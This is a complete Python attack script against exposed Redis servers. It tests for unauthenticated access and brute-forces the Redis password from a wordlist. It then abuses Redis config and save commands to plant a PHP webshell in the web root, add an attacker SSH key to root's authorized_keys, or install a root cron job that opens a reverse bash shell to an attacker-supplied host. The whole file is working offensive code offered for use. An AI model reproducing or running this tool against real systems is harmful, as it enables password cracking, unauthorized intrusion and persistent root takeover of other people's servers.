#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import os
import sys
import socket
from argparse import ArgumentParser

def Banner():
    banner = """
    ____ ____ ___  _ ____    ____ _  _ ____ _    _    
    |__/ |___ |  \ | [__     [__  |__| |___ |    |    
    |  \ |___ |__/ | ___]    ___] |  | |___ |___ |___ 

    Python3 By Forever404
    Usage:python3 RedisShell.py -H 192.168.10.128 -P 6379
    Usage:python3 RedisShell.py -H 192.168.10.128 -P 6379 -p 123456
        """
    print(banner)

class Check():
    def __init__(self):
        self.BUFSIZ = 65535
        self.PASSWORD = ''
        self.TIMEOUT = 10
        self.PORT = 6379
        self.HOST = ''
        self.parsing()

    def parsing(self):
        descript_string = 'The function of this script is to determine whether there is unauthorized access to redis and Brute force redis password'
        parse = ArgumentParser(description=descript_string)
        parse.add_argument("-H", help="please enter a target")  # 可以添加检测IP地址是否合法
        parse.add_argument('-P', help="Please enter the port, otherwise the default is 6379")  # 没有参数值则默认为6379
        parse.add_argument('-a', help="please enter the password,")
        args = parse.parse_args()

        if args.H:
            self.HOST = args.H
        else:
            sys.exit("H parameter cannot be empty")
        if args.P:
            self.PORT = int(args.P)
        if args.a:
            self.PASSWORD = args.a

        self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Socket.connect((self.HOST, int(self.PORT)))

    def check(self):
        if self.PASSWORD:
            self.Socket.send(bytes("AUTH {}\n".format(self.PASSWORD),encoding="UTF-8"))
            receive = self.Socket.recv(self.BUFSIZ)
            if 'OK' in bytes.decode(receive):
                return self.Socket
            else:
                sys.exit("wrong password")
        self.Socket.send(b'info\n')
        receive = self.Socket.recv(self.BUFSIZ)
        if 'redis_version' in bytes.decode(receive):
            print("it is exist vulnerable")
            return self.Socket
        elif 'NOAUTH Authentication required' in bytes.decode(receive):
            print("AUTH Authentication required")
            while True:
                key = input("Please choose whether you need brute force cracking?yes or no:")
                if key == 'yes' or key == 'y' or key == 'Y':
                    password_path = input("please input a ture password path:")
                    Brute = BruteForce(host=self.HOST, port=self.PORT, passwd_path=password_path,Socket=self.Socket,BUFSIZ=self.BUFSIZ)
                    Brute.main()
                    return self.Socket
                elif key =='no' or key =='NO' or key=="n" or key=="N":
                    self.Socket.close()
                    sys.exit()
                else:
                    print("I Don't know what you do,please try again!")
        else:
            print("I don't know whether to enable redis!")

class BruteForce():
    def __init__(self,host,port,passwd_path,Socket,BUFSIZ):
        self.passwd_path = passwd_path
        self.thread_number = 20
        self.Socket = Socket
        self.BUFSIZ = BUFSIZ
        self.host = host
        self.port = port

    def check(self):
        if os.path.exists(self.passwd_path):
            if os.path.isfile(self.passwd_path):
                return True
            else:
                sys.exit("{} not a file".format(self.passwd_path))
        else:
            sys.exit("{} not found".format(self.passwd_path))

    def concet(self,password):
        self.Socket.send(bytes("AUTH {}\n".format(password.decode('UTF-8')), encoding="UTF-8"))
        res = self.Socket.recv(self.BUFSIZ)

        if 'OK' in bytes.decode(res):
            print('[+]:password---{}'.format(password.decode("UTF-8")))
            return True
        else:
            print("[-]:{}".format(password.decode("UTF-8")))

    def main(self):
        if self.check():
            with open(self.passwd_path) as file:
                for line in file.readlines():
                    if "'" not in line and '"' not in line:
                        line = line.rstrip('\n').encode("UTF-8")
                        if self.concet(line):
                            break

class Shell():
    def __init__(self):
        self.save = 'save'
        self.BUFSIZ = 65535
        start = Check()
        self.Socket = start.check()
        print("1:Webshell\n"+"2:ssh\n"+"3:bash\n")

        number = input("please choose which shell or exit:")

        if number=='exit':
            sys.exit("Good bye!!")
        elif number=='1':
            self.Webshell()
        elif number=='2':
            self.ssh()
        elif number=='3':
            self.bash()
        else:
            print("Sorry,I Dont't Know!")

    def send(self,content):
        self.Socket.send(content)
        print("[+]:{}".format(content.decode("UTF-8")))
        res = self.Socket.recv(self.BUFSIZ)
        print(res.decode("UTF-8"))

    def write(self,dir,dbfilename,payload):
        dirtemp = input("Please select the writing dir, otherwise the default:")
        if dirtemp:
            dir = dirtemp
            self.send(bytes("config set dir {}\n".format(dir), encoding="UTF-8"))
        else:
            self.send(bytes("config set dir {}\n".format(dir), encoding="UTF-8"))

        dbfilenametemp = input("Please select the writing dbfilename, otherwise the default:")
        if dbfilenametemp:
            dbfilename = dbfilenametemp
            self.send(bytes("config set dbfilename {}\n".format(dbfilename), encoding="UTF-8"))
        else:
            self.send(bytes("config set dbfilename {}\n".format(dbfilename), encoding="UTF-8"))

        payloadtemp = input("Please select the writing payload, otherwise the default:")
        if payloadtemp:
            payload = payloadtemp
            self.send(bytes('set payload {}\n'.format(payload), encoding="UTF-8"))
        else:
            self.send(bytes('set payload {}\n'.format(payload), encoding="UTF-8"))
        self.send(b"save\n")

    def Webshell(self):
        payload = '"<?php phpinfo(); ?>"'
        dbfilename = 'trojan.php'
        dir = '/var/www/html/'
        self.write(dir=dir,dbfilename=dbfilename,payload=payload)

    def ssh(self):
        while True:
            path = input("input your ssh id_rsa.pub path or exit:")
            if path=='exit':
                sys.exit("God bye!!")
            elif os.path.isfile(path):
                with open(path,'r') as file:
                    id_rsa_pub = file.readline().rstrip('\n')
                    break
            else:
                print("this path {} is not found!".format(path))

        payload = r'"\n\n\n\{}\n\n\n"'.format(id_rsa_pub)
        dbfilename = 'authorized_keys'
        dir = '/root/.ssh/'
        self.write(dir=dir, dbfilename=dbfilename, payload=payload)

    def bash(self):
        while True:
            addr = input("input your server addr or exit:")
            port = input("input your server port or exit:")
            if addr=='exit' or port=='exit':
                sys.exit("Good bye!!!")
            elif addr and port:
                print("your server addr and port is {}:{}".format(addr,port))
                break

        payload = r'"\n\n\n* * * * * bash -i >& /dev/tcp/{}/{} 0>&1\n\n\n"'.format(addr,port)
        dbfilename = 'root'
        dir = '/var/spool/cron/'
        self.write(dir=dir,dbfilename=dbfilename,payload=payload)

if __name__ == '__main__':
    Banner()
    shell = Shell()